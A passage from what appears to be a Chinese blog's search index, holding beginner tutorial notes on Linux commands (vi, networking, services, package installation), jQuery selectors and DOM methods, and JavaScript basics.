不保存文本并强制退出vi （常用） :wq 保存文本并退出vi （常用） 3、编辑模式进入文本编辑器，输入【i&#x2F;I、o&#x2F;O、a&#x2F;A、r&#x2F;R】进入编辑模式： ​ i：在光标处插入(常用) ​ I：在光标所在行第一个非空格字符处插入 – 行首 (常用) o：在光标所在行的下一行插入新的一行(常用) – Other O：在光标所在行的上一行插入新的一行 a：在光标所在位置的下一个字符处开始插入 A：在光标所在行的最后一个位置开始插入 – 行尾 (常用) r：替换光标所在位置的字符(只替换一次) R：一直替换光标所在位置的字符，直到按(esc)键为止 4、删除、复制、粘贴、撤消 ​ dd：删除(剪切)光标所在行 ​ ndd: 删除(剪切)光标所在的向下n行 5dd ​ yy: 复制当前行 ​ nyy: 复制光标所在的向下n行 6yy ​ p: 将已复制的数据在光标下一行粘贴 ​ P: 将已复制的数据在光标上一行粘贴 ​ u: 撤消删除 ​ shift + g 文件尾 ​ shift + G 文件头 七、网络1、查看ip地址[root@localhost ~]# ip addr 2、设置虚拟机ip vi /etc/sysconfig/network-scripts/ifcfg-eno167xxxx 将其中的 ONBOOT=yes （按i键进入insert 修改完后 按esc 再输入:wq 回车） systemctl restart network 重启网络服务 3、设置防火墙 查看防火墙状态 systemctl status firewalld.service 关闭防火墙 systemctl stop firewalld.service 启动防火墙 systemctl start firewalld.service 4、hosts设置vi /etc/hosts 123127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.1.100 Mr_lee 将ip为192.168.1.100 的设置为Mr_lee 此时可以这样使用： 1ping Mr_lee # ping 192.168.1.100 5、主机名设置vi /etc/hostname 八、服务1、服务设置systemctl start/stop/restart/status 服务名.service 2、服务开机自动启动 列出所有系统服务,并检查是否开机启动 [root@Server ~]# systemctl list-unit-files --type service 服务开机不启动 [root@Server ~]# systemctl disable firewalld.service 服务开机启动 [root@Server ~]# systemctl enable firewalld.service 九、软件安装1、rpm命令rpm这种软件包就像windows的EXE安装文件一样，各种文件已经编译好，并打了包，哪个文件该 放到哪个文件夹，都指定好了，安装非常方便，在图形界面里你只需要双击就能自动安装。 查询所有已安装的软件包的包名 （q:查询 a:所有） [root@Server ~]# rpm -qa 查询python软件包的安装位置（q:查询 l:位置 python软件包名） [root@Server ~]# rpm -ql python 查看已安装的软件的信息（i: info 信息） [root@Server ~]# rpm -qi python 123Name : python Relocations: (not relocatable)Version : 2.6.6 Vendor: CentOSRelease : 51.el6 Build Date: Fri 22 Nov 2013 08:18:53 PM CST 安装软件 （i:安装 v:显示安装过程 h:显示安装细节） ​ rpm –ivh xxxx.rpm 查看安装的软件的完整包名 ​ rpm –qa| grep python 卸载软件 (e:卸载) ​ rpm –e 包名 2、tar命令参数 c 压缩文件 x 解压文件 z 格式为gzip v 显示执行文件列表 f 要操作的文件 直接解压 ​ tar –zxvf xxx.tar &#x2F; xxx.tar.gz 解压后，编译安装 ​ 一般tar包中已经是编译好的文件，解压即可直接使用；也存在一些tar包，在解压后需要 ​ 进行编译，则需要经过 configure -&gt; make -&gt; make install 3、Yum命令基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装。 Yum是centOS独有的安装命令，需要外网环境，可以自动加载安装文件，及其所有依赖资源，并自动完成软件安装。 安装redis 和 nginx时可以采用。","categories":[],"tags":[]},{"title":"","slug":"jQuery","date":"2024-10-24T11:20:58.377Z","updated":"2024-10-07T05:20:52.374Z","comments":true,"path":"2024/10/24/jQuery/","permalink":"http://example.com/2024/10/24/jQuery/","excerpt":"","text":"jQuery一、简介1、什么是jQueryJavaScript的框架，是一套工具库。简化了JavaScript的功能实现。可以使得开发者写更少的代码，却做更多的事-write less do more。 可以兼容不同的浏览器 JQuery是一个工具库，是对JS的代码进行了一次封装 JS代码和JQuery代码对比： 123456JS： 通过js来获取页面上的一个div: document.getElementById(&quot;d1&quot;)JQuery: 通过JQ来获取页面上的一个div: $(&quot;#d1&quot;) 2、jQuery功能jQuery库包含以下功能： HTML 元素选取 HTML 元素操作 CSS 操作 HTML 事件函数 JavaScript 特效和动画 HTML DOM 遍历和修改 3、安装有两个版本的 jQuery 可供下载： Production version - 用于实际的网站中，已被精简和压缩。 jquery-1.8.3.js Development version - 用于测试和开发（未压缩，是可读的代码） jquery-1.8.3.min.js 123&lt;head&gt; &lt;script src=&quot;jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt; &lt;!--引用jquery库--&gt;&lt;/head&gt; 4、初识jQuery12345678910111213141516&lt;head&gt; &lt;title&gt;初识jQuery&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;script src=&quot;jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function myclick() &#123; $(&quot;#pid&quot;).hide() //获取id为pid的标签，并将其隐藏 &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;pid&quot;&gt;做一个决定，并不难，难的是付诸行动，并且坚持到底。&lt;/p&gt; &lt;input type=&quot;button&quot; name=&quot;&quot; value=&quot;点击&quot; onclick=&quot;myclick()&quot;&gt;&lt;/body&gt; 二、jQuery选择器jQuery 选择器允许对 HTML 元素组或单个元素进行操作。 jQuery 选择器基于元素的 id、类、类型、属性、属性值等”查找”（或选择）HTML 元素。 jQuery 中所有选择器都以美元符号开头：$()。 1、基本选择器1.1 元素选择器1$(&quot;p&quot;).hide(); // 所有的p标签都被隐藏 1.2 #id选择器1$(&quot;#test&quot;); //id值为test的标签 1.3 .class选择器1$(&quot;.test&quot;); //类名为test的标签 1.4 *全选择器1$(&quot;*&quot;); //所有的标签，全文档 1.5 多选择器共用123456var p = $(&quot;p.pc&quot;) //p标签且类名为pc的标签var p = $(&quot;p#pid&quot;) //p标签且id为pid的标签var p = $(&quot;div,p&quot;) //多个标签同时获取，用逗号分隔 1.6 jQuery对象与DOM对象区别DOM获取元素： 1document.getElement...(xxx) //返回DOM对象 jQuery获取元素： 1$(&quot;xxx&quot;) //返回jQuery对象 都是对一个或多个标签的封装，都指向一个或多个标签，只是支持的功能不一样，DOM对象和Jquery对象都有各自的方法 jQuery对象与DOM对象相互转换 DOM –&gt; jQuery 123var div = document.getElementById(&quot;div_1&quot;); //DOM对象var div_jq = $(div) //jquery对象 jQuery –&gt; DOM 12345var div = $(div) //jquery对象var div = div.get(0) //DOM对象var div = div[0] //DOM对象 2、层级选择器最好select1使用id选择 2.1 后代选择器 派生选择器$(“selector1 selector2”) 中间有空格 12$(&quot;div .a&quot;); //选择所有的div，其中样式类为a的后代$(&quot;div .a input&quot;); //选择所有的div，其中样式类为a的后代，再选择这些后代的input后代标签 2.2 儿子选择器$(“selector1 &gt; selector2”); 中间为大于号 123$(&quot;span &gt; input&quot;); //所有的span的input子标签$(&quot;div span&gt;input&quot;); //所有的div下的span的input子标签 2.3 毗邻$(“selector1+selector2”) 中间为加号 123$(&quot;div+p&quot;) ; //紧邻div的p标签$(&quot;div+p+input&quot;) //紧邻div的p标签紧邻的input标签 2.4 弟弟$(“selector1~selector2”) 中间为破折号 1$(&quot;div~p&quot;) ; //紧邻div后的所有p标签 3、基本过滤选择器 ：first 选出匹配到的标签中的第一个标签 12345678910var p = $(&quot;div&gt;b&gt;p:first&quot;)p.hide() //将div下的b标签下的第一个p标签隐藏&lt;div&gt; &lt;b &gt; &lt;p id=&quot;pid&quot; class=&quot;a&quot;&gt;1.做一个决定，并不难，难的是付诸行动，并且坚持到底。&lt;/p&gt; &lt;p id=&quot;pid2&quot;&gt;2.做一个决定，并不难，难的是付诸行动，并且坚持到底。&lt;/p&gt; &lt;/b&gt;&lt;/div&gt; ：last 选出匹配到的标签中的最后一个标签 1$(&quot;div&gt;p:last&quot;) //div标签下的所有p标签中的第一个 ：eq(index) 选出对应index索引值的标签 index从0开始 1$(&quot;div&gt;p:eq(1)&quot;) //div下的所有p标签中 索引值为1的标签 ：gt(index) 选出索引大于index的元素 1$(&quot;div&gt;input:gt(1)&quot;); //div下所有input子标签中索引大于1的 ：lt(index) 选出索引小于index的元素 1$(&quot;div&gt;input:lt(1)&quot;);//div下所有input子标签中索引小于1的 ：odd 选出索引值为奇数的元素 1$(&quot;div&gt;input:odd&quot;);//div下所有input子标签中索引为1,3,5..的 ：even 选出索引值为偶数的元素 1$(&quot;div&gt;input:odd&quot;);//div下所有input子标签中索引为2,4,6..的 ：not(selector) 选出selector不能匹配到的元素 123$(&quot;div&gt;input:not(.a)&quot;); //div下所有input子标签中样式类名不是a的 $(&quot;#abc&gt;li:not(#a)&quot;); //id为abc的标签下的li子标签中id不是a的$(&quot;#abc&gt;li:not(:eq(2))&quot;);//id为abc的标签下的li子标签中索引不是2的 4、内容过滤选择器 （了解） ：contains 模糊匹配 (自己含有，或后代含有) 1$(&quot;div:contains(&#x27;2&#x27;)&quot;) div或div下内容包括2的标签 ：empty 没有内容的标签 1$(&quot;p:empty&quot;) //没有内容的p标签 ：parent 包含子元素或文本内容 1$(&quot;p:parent&quot;) //有文本内容或子标签的p标签 ：has(selector) 拥有某种后代的标签 1$(&quot;div:has(&#x27;p&#x27;)&quot;) //有p标签的div标签 5、属性过滤选择器 $(&quot;[name]&quot;) 有name属性的 $(&quot;[name=&#39;zhj&#39;]&quot;) name属性值为zhj的 $(&quot;[value=&#39;male&#39;]&quot;) value属性值为male的 $(&quot;[type=&#39;text&#39;]&quot;) type属性值为text的 1$(&quot;div[name=&#x27;abc&#x27;]&quot;); //div标签且name为abc 6、可见性过滤选择器 :visible 可见元素 :hidden 隐藏元素 123456789101112131415&lt;script type=&quot;text/javascript&quot;&gt; function myclick() &#123; $(&quot;div p:empty&quot;).hide(); console.log($(&quot;div p:visible&quot;)); &#125;&lt;/script&gt;&lt;div&gt; &lt;p id=&quot;pid&quot; class=&quot;a&quot;&gt;1.做一个决定，并不难，难的是付诸行动，并且坚持到底。&lt;/p&gt; &lt;p id=&quot;pid2&quot;&gt;2.做一个决定，并不难，难的是付诸行动，并且坚持到底。&lt;/p&gt; &lt;p&gt;&lt;/p&gt;&lt;/div&gt;&lt;input type=&quot;button&quot; name=&quot;&quot; value=&quot;点击&quot; onclick=&quot;myclick()&quot;&gt; jQuery对象遍历 123456789var plist = $(&quot;:input&quot;);for(var i = 0; i&lt;plist.size();i++)&#123; var pd = plist.get(i); //DOM对象 var pq = plist.eq(i); //jquery对象 console.log($(pd).val()); console.log(pq.val());&#125; 或者 1234var ps = $(&quot;div p&quot;);ps.each(function(i)&#123; //i为循环变量 0，1，2... console.log(this) //this为当前遍历到的每一个DOM对象&#125;); 三、jQuery事件1、事件注册的方式 基于标签：和之前JS中使用方式一致,Jquery未加干涉 基于编程：Jquery提供了全新的API 123456$(document).ready(function()&#123; $(&quot;#btn_1&quot;).click(function(event)&#123; console.log($(this).val()); //this为当前触发事件的标签的DOM对象 console.log(this.value); &#125;)&#125;) Ready事件 等价于onload的作用，用于保证代码的执行在页面加载之后 12$(document).ready(function()&#123;...&#125;);$(function()&#123;...&#125;) //简写 2、jQuery事件函数 鼠标事件 键盘事件 表单事件 click() keypress() change() dblclick() keydown() focus() mouseover() keyup() blur() mousemove() mouseout() 四、jQuery DOMjQuery 中非常重要的部分，就是操作 DOM 的能力。 jQuery 提供一系列与 DOM 相关的方法，这使访问和操作元素和属性变得很容易。 1、获取内容 text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值 12345678910111213141516171819202122232425&lt;script &gt; $(function()&#123; $(&quot;#btn&quot;).click(function()&#123; var pe = $(&quot;div&quot;); var text = pe.text(); //获得标签文本内容 console.log(text); var html = pe.html(); //获取标签内容（包括HTML标记） console.log(html); console.log($(this).val()); //表单value $(this).val(&quot;不要点我&quot;); //修改value值 -- 通过参数 上同 &#125;)&#125;)&lt;/script&gt;&lt;div&gt;abc &lt;p id=&quot;pid&quot; class=&quot;a&quot;&gt; 1.做一个决定，并不难，难的是付诸行动，并且坚持到底。 &lt;/p&gt;&lt;/div&gt;&lt;input type=&quot;button&quot; value=&quot;点我&quot; id=&quot;btn&quot;&gt; 2、获取属性jQuery attr() 方法用于获取属性值。 attr(&quot;属性名&quot;) 获取属性名 attr(&quot;属性名&quot;,&quot;属性值&quot;) 设置属性值 attr(&#123;属性名1:属性值, 属性名2:属性值,...&#125;) 一次设置多个属性值 removeAttr(&quot;属性名&quot;) 删除标签的属性 prop 和attr使用一致，作用一致；但prop在获取bool类型属性时(checked,selected)更友好 123456789101112$(function()&#123; $(&quot;:input&quot;).click(function()&#123; var attr = $(&quot;a&quot;).attr(&quot;href&quot;); //获取href属性值 console.log(attr); $(&quot;a&quot;).attr(&quot;href&quot;,&quot;http://www.baidu.com&quot;); //修改href属性值 &#125;)&#125;)&lt;a href=&quot;http://www.baizhiedu.com&quot; style=&quot;text-decoration: none&quot; target=&quot;_blank&quot;&gt;百知教育&lt;/a&gt;&lt;input type=&quot;button&quot; value=&quot;点我&quot;&gt; 3、添加元素创建标签 1$(&#x27;&lt;p&gt;沙河&lt;/p&gt;&#x27;)--&gt;jq标签对象 append() - 在被选元素最后一个位置插入内容 prepend() - 在被选元素的开头插入内容 after() - 在被选元素之后插入内容 before() - 在被选元素之前插入内容 1234567891011121314&lt;script &gt;$(function()&#123; $(&quot;#btn&quot;).click(function()&#123; $(&quot;#div_1&quot;).append(&quot;&lt;p&gt;通过 jQuery，可以很容易地添加新元素/内容。&lt;/p&gt;&quot;) &#125;)&#125;)//简便写法:在div内部的最前面加一个p标签$(&#x27;#d1&#x27;).prepend(&#x27;&lt;p&gt;沙河&lt;/p&gt;&#x27;)&lt;/script&gt;&lt;div id=&quot;div_1&quot;&gt; abc&lt;/div&gt;&lt;input type=&quot;button&quot; value=&quot;添加&quot; id=&quot;btn&quot;&gt; 4、删除元素 remove() - 删除被选元素（及其子元素） empty() - 清空元素内容 5、jQuery CSS类 addClass() - 向被选元素添加一个或多个类 removeClass() - 从被选元素删除一个或多个类 通过添加class实现 当点击button时将div的文本颜色改为blue，字体改为120px。 12345678910111213141516171819202122&lt;!--样式表--&gt;&lt;style type=&quot;text/css&quot;&gt; .blue&#123; color: blue; font-size: 120px; &#125;&lt;/style&gt;&lt;!--jquery代码--&gt;&lt;script&gt;$(function()&#123; $(&quot;#btn&quot;).click(function()&#123; $(&quot;#div_1&quot;).addClass(&quot;blue&quot;) &#125;)&#125;)&lt;/script&gt;&lt;!--HTML--&gt;&lt;div id=&quot;div_1&quot;&gt; 这是一个文本&lt;/div&gt;&lt;input type=&quot;button&quot; value=&quot;添加&quot; id=&quot;btn&quot;&gt; 6、css( )方法css() 方法设置或返回被选元素的一个或多个样式属性。 css(&quot;样式属性名&quot;) 获取样式属性值 css(&quot;样式属性名&quot;，&quot;样式属性值&quot;) 设置样式属性值 css(&#123;&quot;样式属性名1&quot;:&quot;样式属性值&quot;,&quot;样式属性名2&quot;:&quot;样式属性值&quot;,..&#125;) 设置多个样式属性值 123$(&quot;#div_1&quot;).css(&quot;color&quot;,&quot;blue&quot;); //设置css样式属性值console.log($(&quot;#div_1&quot;).css(&quot;color&quot;)); //获取css样式属性值$(&quot;#div_1&quot;).css(&#123;&quot;background-color&quot;:&quot;blue&quot;,&quot;color&quot;:&quot;white&quot;,&quot;font-size&quot;:&quot;50px&quot;&#125;); //一次设置多个属性 补充(了解)： 使用 on() 方法添加的事件处理程序适用于当前及未来的元素（比如由脚本创建的新元素）。 1234//ul 给所有的内部li加点击事件 $(&#x27;#u1&#x27;).on(&#x27;click&#x27;,&#x27;li&#x27;,function () &#123; console.log(this) &#125;) 1&lt;script src=&quot;https://code.jquery.com/color/jquery.color-2.2.0.min.js&quot; integrity=&quot;sha256-aSe2ZC5QeunlL/w/7PsVKmV+fa0eDbmybn/ptsKHR6I=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; 动画(了解)： 12345678//$(&#x27;div&#x27;).hide(3000) // $(&#x27;div&#x27;).toggle(3000) // $(&#x27;div&#x27;).slideUp(3000) // $(&#x27;div&#x27;).slideToggle(3000) // $(&#x27;div&#x27;).fadeIn(3000,0.1) // $(&#x27;div&#x27;).fadeToggle(3000,function () &#123; // alert(&#x27;hehe&#x27;) // &#125;) 12345获取上一个兄弟 prev()获取下一个兄弟 next()获取父标签 parent()获取子标签 children().eq(index)选择索引为index的jquery对象","categories":[],"tags":[]},{"title":"","slug":"Javascript ","date":"2024-10-24T11:20:58.365Z","updated":"2024-10-07T05:20:53.466Z","comments":true,"path":"2024/10/24/Javascript /","permalink":"http://example.com/2024/10/24/Javascript%20/","excerpt":"","text":"Javascript一、简介JavaScript一种直译式脚本语言，是一种动态类型 (定义变量时不需要指定变量类型)、弱类型(隐形类型转换 不同类型的值做运算不会报错,会转化其他类型)、基于原型的语言(没有类,只有对象,对象可以继承对象)，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML网页上使用，用来给HTML网页增加动态功能。 JavaScript 被数百万计的网页用来改进设计、验证表单、检测浏览器、创建cookies，以及更多的应用。 JavaScript 是因特网上最流行的脚本语言。 JavaScript是一种轻量级、解释型、脚本编程语言，可以执行在所有现代浏览器中。 学习目标：JavaScript语法，将JavaScript运用在HTML中定制交互行为，定制前端逻辑 二、第一个程序1、初识Javascript1234567891011121314&lt;html&gt;&lt;head&gt; &lt;title&gt;学习HTML基本语法&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; //警告弹窗 alert(&#x27;Hello World&#x27;); //向开发者工具的console中输出日志 console.log(&#x27;日志内容&#x27;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; ...&lt;/body&gt;&lt;/html&gt; HTML 的 &lt;script&gt; 标签用于把 JavaScript代码 插入 HTML 中； script标签可以出现在html的head或body位置，一般常放在head中； 也可以引入外部的js文件 &lt;script src=&quot;myScript.js&quot;&gt;&lt;/script&gt; 2、注释 单行注释 &#x2F;&#x2F; 多行注释 &#x2F;* … *&#x2F; 三、变量和数据类型1、变量js是弱类型语言，所以在定义变量时不需要指定类型，直接用var关键字定义即可。 1234var x=5; var y=6;var z=x+y; console.log(z); 2、数据类型字符串（String）、数字(Number)、布尔(Boolean)、对象(Object)、未定义（Undefined） 2.1 字符串声明字符串 1234var carname = &quot;Volvo XC60&quot;;console.log(carname)var carname = &quot;tesla modelX&quot;; console.log(typeof carname); 大小写转换 1234var lower = carname.toLowerCase()console.log(lower)var upper = carname.toUpperCase()console.log(upper) 分隔字符串 123var r = carname.split(&#x27; &#x27;)console.log(r)console.log(r[1]) 2.2 数字JavaScript不区分整数类型和浮点类型 。 12345var age = 18;var price = 10.99;var a = 3;console.log(typeof age)console.log(typeof price) //=&gt; number 2.3 布尔12var y = true;console.log(y); 2.4 数组1234567891011var arr = [2,4,6,8,22];for (var i = 0;i&lt;arr.length;i++) &#123; console.log(arr[i]);&#125;arr[5] = 40; //在下标为5的位置添加40 并且删除原来位置上的元素console.log(arr.length); // =&gt; 6var n_a = arr.slice(0,2)// 切片console.log(n_a)arr.push(30)console.log(arr) 2.5 Object对象如下两种创建方式，方式一不建议使用，方式二的创建方式更轻便，建议使用 1234567891011121314//方式一：var obj = new Object();obj.name=&quot;Mr_lee&quot;;obj.age=18;obj.sayHi=function()&#123; //为对象添加方法 console.log(&quot;hi~&quot;) &#125;//方式二： var obj2=&#123;name:&#x27;Mr_lee&#x27;,age:18,sayHi:function()&#123;console.log(&quot;hi~&quot;);&#125;&#125;//使用console.log(obj.name)console.log(obj2.name)obj.sayHi()obj2.sayHi() 2.6 日期类型1234567891011var a = new Date() //当前系统时间var b = new Date(2018,5,28,10,9,10) // year month day hour minute second ,月份从0开始var b = new Date(2018,5,28)a.getFullYear();a.getMonth(); //月份，一月是0a.getDate(); a.getDay(); //一周的第几天 周日是0a.getHours();a.getMinutes();a.getSeconds();a.getTime(); 2.7 特殊类型 undefined：未赋值的变量的默认值 var a;alert(a) NaN:not a number, 比如 b &#x3D; “sf”&#x2F;2; b的值就是NaN null:用于置空变量，不是默认值，需要手动赋值 var a&#x3D;”sdf”; a&#x3D;null;alert(a) 四、Math对象Math 对象用于执行数学任务。 12var x = Math.PI; // 返回PIvar y = Math.sqrt(16); // 返回16的平方根 1、Math对象属性 属性 描述 E 返回算术常量 e，即自然对数的底数（约等于2.718）。 LN2 返回 2 的自然对数（约等于0.693）。 LN10 返回 10 的自然对数（约等于2.302）。 LOG2E 返回以 2 为底的 e 的对数（约等于 1.414）。 LOG10E 返回以 10 为底的 e 的对数（约等于0.434）。 PI 返回圆周率（约等于3.14159）。 SQRT1_2 返回 2 的平方根的倒数（约等于 0.707）。 SQRT2 返回 2 的平方根（约等于 1.414）。 2、Math对象方法 方法 描述 abs(x) 返回 x 的绝对值。 acos(x) 返回 x 的反余弦值。 asin(x) 返回 x 的反正弦值。 atan(x) 以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。 atan2(y,x) 返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。 ceil(x) 对数进行上舍入。 cos(x) 返回数的余弦。 exp(x) 返回 Ex 的指数。 floor(x) 对 x 进行下舍入。 log(x) 返回数的自然对数（底为e）。 max(x,y,z,…,n) 返回 x,y,z,…,n 中的最高值。 min(x,y,z,…,n) 返回 x,y,z,…,n中的最低值。 pow(x,y) 返回 x 的 y 次幂。 random() 返回 0 ~ 1 之间的随机数。 round(x) 把数四舍五入为最接近的整数。 sin(x) 返回数的正弦。 sqrt(x) 返回数的平方根。 tan(x) 返回角的正切。 五、运算符 算数运算符（+ - * ** &#x2F; % ++ –） 比较运算符（&gt; &gt;&#x3D; &lt; &lt;&#x3D; &#x3D;&#x3D; !&#x3D; &#x3D;&#x3D;&#x3D; !&#x3D;&#x3D;） 逻辑运算符（&amp;&amp; || !） 赋值运算符（&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D; ） 字符串连接运算符（+） 三元运算符（? :） 1、算数运算符自增运算符 : 123456var x = 3;console.log( x++ );// 输出 3console.log( x );// 输出 4var y = 3;console.log( ++y );// 输出 4console.log( y );// 输出 4 自减运算符 123456var x = 3;console.log( x-- );// 输出 3console.log( x );// 输出 2var y = 3;console.log( --y );// 输出 2console.log( y );// 输出 2 2、比较运算符 &#x3D;&#x3D;&#x3D; 两个运算数的值相等并且类型相同时，结果为true。 !&#x3D;&#x3D; 两个运算数的值不等或者类型不同时，结果为true。 3、逻辑运算符​ &amp;&amp; 逻辑与 – python中的and ​ || 逻辑或 – python中的or ​ ！逻辑非 – python中的not 4、赋值运算符5、字符串连接运算符1234var str1 = &quot;Hello&quot;;var str2 = &quot;Word&quot;;var str3 = str1 + str2;console.log(str3); 6、三元运算符表达式一?表达式二 :表达式三 判断表达式一是否为真，为真取表达式一的值，否则取表达式二的值 1234var a = 10;var b = 5;var c = a &gt; b ? a : b;console.log(c); 六、流程控制1、条件语句条件语句就是指通过判断指定的计算结果，来决定是执行还是跳过指定的语句块。 JavaScript提供了两种条件语句：if else语句和switch case语句。 1.1 if语句1234var num = 5;if( num &lt; 10 )&#123; console.log( num );&#125; 1.2 if else语句123456var score = 68;if( score &lt; 60 )&#123; console.log(&quot;不及格&quot;);&#125;else&#123; console.log(&quot;及格&quot;);&#125; 1.3 else if语句12345678var score = 68;if( score &gt; 90 )&#123; console.log(&quot;优秀&quot;);&#125;else if( score &gt;= 80 )&#123; console.log(&quot;良好&quot;);&#125;else&#123; console.log(&quot;一般&quot;);&#125; 1.4 switch case语句（python中没有）1234567891011var num = 2;switch( num )&#123; case 1: console.log(&quot;查询余额&quot;); break; case 2: console.log(&quot;在线充值&quot;); break; default: console.log(&quot;转人工服务&quot;);&#125; 2、循环语句循环语句是一系列反复执行到复合特定条件的语句。 2.1 for语句12345for( var i = 1; i &lt; 10; i++ )&#123; for( var j = 1; j &lt;= i; j++ )&#123; console.log(i + &quot;*&quot; + j + &quot;=&quot; + (i*j)); &#125;&#125; 2.2 while语句12345var num = 0;while( num &lt; 10 )&#123; console.log( num ); num = num + 1;&#125; 2.3 do..while语句12345var num = 0;do&#123; console.log( num ); num = num + 1;&#125;while( num &lt; 10 ); 3、break和continue break语句是中断语句，用于终止循环语句或开关语句。 123456for( var i = 0; i &lt; 10; i++ )&#123; if( i == 5 )&#123; break; &#125; console.log( i );&#125; continue语句跳过本次循环。 123456for( var i = 0; i &lt; 10; i++ )&#123; if( i == 5 )&#123; continue; &#125; console.log( i );&#125; 七、函数1、基本语法1234function 方法名(参数1,参数2)&#123; ... return ...&#125; 1234function fn()&#123; console.log(&quot;this is function&quot;);&#125;fn(); 2、匿名函数1234var fn = function(a,b)&#123; //定义匿名函数，并赋值给一个变量 alert(a+&quot; -- &quot;+b) &#125;fn(18,&quot;Mr_lee&quot;) //调用 八、事件HTML 4.0 的新特性之一是有能力使 HTML 事件触发浏览器中的动作（action），比如当用户点击某个 HTML 元素时启动一段 JavaScript。 1、事件注册事件注册：定义函数myClick , 并在标签的事件中调用方法：onclick&#x3D;”myClick()” 1234function myClick()&#123; alert(&quot;我被点击了！&quot;)&#125;&lt;input type=&quot;button&quot; onclick=&quot;myClick();&quot; value=&quot;click_me&quot;/&gt; 2、可用事件 事件名 事件描述 onclick 鼠标点击时触发 ondblclick 鼠标双击时触发 onfocus 元素获得焦点时触发 onblur 元素失去焦点时触发 onchange 用户改变域的内容 onmouseover 鼠标被移动到某个元素上（触发一次） onmousemove 鼠标在元素内部移动时，不断触发 onmouseout 鼠标从元素移开 onkeydown 键盘某个键被按下 onkeypress 键盘的键被按下或按住 onkeyup 键盘的键被松开 onload 用于body标签，页面加载完毕时触发一次 3、event对象在触发的事件的函数里面我们会接收到一个event对象,通过该对象我们需要的一些参数,比如说我们需要知道此事件作用到谁身上了,就可以通过event的属性target来获取到 。 123456789101112&lt;script&gt; function myClick(a)&#123; //a = 接收事件对象 ，从onclick=&quot;myClick(event);&quot;中传来 alert(&quot;button clicked~&quot;) console.log(a) console.log(a.type) //事件类型 console.log(a.clientX) //事件触发x坐标 console.log(a.clientY) //事件触发x坐标 console.log(a.target) //事件源-触发事件的标签 console.log(a.target.value) //获取事件源的属性值 &#125;&lt;/script&gt;&lt;input type=&quot;button&quot; onclick=&quot;myClick(event);&quot; value=&quot;click_me&quot;/&gt; 4、事件冒泡一个标签触发事件后，事件会向上传递给自己的父标签，然后父标签的父标签…. 1234567891011121314function div_click()&#123; console.log(&#x27;div_click&#x27;)&#125;function btn_click(e)&#123; console.log(&#x27;btn_click&#x27;) e.stopPropagation() //阻断事件向上传递&#125;&lt;div onclick=&quot;div_click()&quot; style=&quot;width: 300px;height: 200px; background-color: blue;&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;点击&quot; onclick=&quot;btn_click(event)&quot;&gt;&lt;/div&gt; 事件的冒泡，不会因为事件源没有该事件，而不冒泡；也不会因为某个中间的父标签没有该事件而停止冒泡。 注意：当父元素和子元素都有某一个事件，且需要独立执行时，冒泡会使得事件同时执行，所以需要防止。 5、常用技巧5.1 超链接为超链接注册单击事件，需要阻止其href （javascript:void(0)） 123456function myClick()&#123; console.log(&#x27;go go go&#x27;)&#125;&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;myClick()&quot;&gt;go&lt;/a&gt; 5.2 form表单form表单提交前，如果需要处理其他逻辑 先将提交按钮改为普通按钮，然后在按钮事件中手动提交表单。即可实现灵活的表单控制！ 123456789101112function myClick() &#123; ....逻辑处理...1 document.forms[0].submit();//手动获取form，并提交 ....逻辑处理...2var f1 =document.getElementById(&#x27;f1&#x27;) f1.submit() &#125; &lt;form action=&quot;http:www.baidu.com&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;button&quot; name=&quot;&quot; value=&quot;提交&quot; onclick=&quot;myClick()&quot;&gt;&lt;/form&gt; 5.3 this 当前元素12345function myClick(a) // a=this，当前触发事件的元素&#123; console.log(a)&#125; &lt;input type=&quot;button&quot; name=&quot;&quot; value=&quot;提交&quot; onclick=&quot;myClick(this)&quot;&gt; 6、另外的事件注册方式（Dom）基于编程的事件注册，语法如下： 123456789101112131415&lt;head&gt; &lt;title&gt;学习Javascript&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; var button = document.getElementById(&#x27;btn&#x27;) //获得标签 button.onclick = function() //注册事件 &#123; console.log(&#x27;注册成功&#x27;) &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;http:www.baidu.com&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;提交&quot;&gt; &lt;/form&gt;&lt;/body&gt; 如上语法，则使得html逻辑和js逻辑的耦合降到最低！ 原因：标签还未出现，就去为标签注册事件！！ 解决方案： onload或者 script后置 window.onload 12345678910111213//解决方案1：onload事件function onload9()&#123;//load事件的handler，整个的页面加载完毕后执行 //1.获取按钮 var btn9 = document.getElementById(&quot;btn&quot;); //2.注册事件 btn9.onclick=function()&#123; alert(&quot;clicked~~~&quot;); &#125;&#125;...&lt;body onload=&quot;onload9();&quot;&gt; &lt;!--注册onload事件--&gt; .... &lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;提交&quot;&gt;&lt;/input&gt; 123456789101112131415//解决方案2：script后置&lt;form action=&quot;http://www.baidu.com&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;usermae&quot;/&gt;&lt;br/&gt; &lt;input type=&quot;text&quot; name=&quot;password&quot;/&gt;&lt;br/&gt; &lt;input type=&quot;button&quot; value=&quot;提交&quot; id=&quot;btn&quot;/&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt; //1.获取按钮 var btn115 = 